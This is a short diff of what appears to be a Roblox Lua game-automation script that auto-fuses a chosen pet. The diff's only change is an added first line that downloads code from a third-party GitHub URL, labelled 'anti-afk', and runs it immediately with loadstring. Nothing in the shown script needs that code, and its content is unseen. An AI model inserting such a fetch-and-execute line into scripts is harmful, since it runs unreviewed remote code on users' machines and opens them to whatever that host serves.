@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Darks-scripts/anti-afk-/main/darkscripts"))()
+
 _G.autoFuse = true
 
 local PET_TO_FUSE = "Potion Poodle" -- name of the pet you want to fuse
